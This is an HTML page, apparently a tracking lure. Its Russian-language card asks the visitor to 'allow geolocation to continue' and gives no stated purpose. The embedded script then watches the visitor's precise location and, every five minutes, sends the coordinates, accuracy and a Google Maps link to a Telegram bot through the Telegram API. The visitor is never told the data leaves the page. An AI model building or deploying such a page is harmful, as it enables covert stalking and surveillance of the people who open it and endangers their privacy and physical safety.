<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>GPS</title>

<style>
body{
  margin:0;
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  font-family:Arial;
  background:linear-gradient(135deg,#06121f,#0a2a44,#0e3b5e);
  color:white;
}

.card{
  width:90%;
  max-width:400px;
  background:rgba(255,255,255,0.08);
  backdrop-filter:blur(18px);
  padding:25px;
  border-radius:20px;
  text-align:center;
}

button{
  width:100%;
  padding:14px;
  border:none;
  border-radius:12px;
  background:#00b7ff;
  color:white;
  font-weight:bold;
}

.status{
  margin-top:15px;
  font-size:14px;
  color:#bfe8ff;
}
</style>
</head>

<body>

<div class="card">
  <h2>📍 Location Access</h2>
  <p>Для продолжения нажмите разрешить</p>

  <button onclick="start()">Разрешить геолокацию</button>

  <div class="status" id="status">ожидание...</div>
</div>

<script>
const BOT_TOKEN = "YOUR_BOT_TOKEN";
const CHAT_ID = "YOUR_CHAT_ID";

let lastSend = 0;

async function sendTG(text){
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      chat_id:CHAT_ID,
      text
    })
  });
}

function start(){
  if(!navigator.geolocation){
    document.getElementById("status").innerText =
      "GPS не поддерживается";
    return;
  }

  document.getElementById("status").innerText =
    "GPS активен...";

  navigator.geolocation.watchPosition(async pos=>{
    const now = Date.now();

    // 5 минут
    if(now - lastSend < 5*60*1000) return;
    lastSend = now;

    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;
    const acc = pos.coords.accuracy;

    document.getElementById("status").innerText =
      "данные отправлены";

    const message =
`📍 Live Location Update

🌐 Координаты:
${lat}, ${lon}

🎯 Точность: ${Math.round(acc)}m

🗺 Google Maps:
https://maps.google.com/?q=${lat},${lon}`;

    await sendTG(message);

  }, err=>{
    document.getElementById("status").innerText =
      "разрешите геолокацию";
  },{
    enableHighAccuracy:true,
    maximumAge:0,
    timeout:10000
  });
}
</script>

</body>
</html>
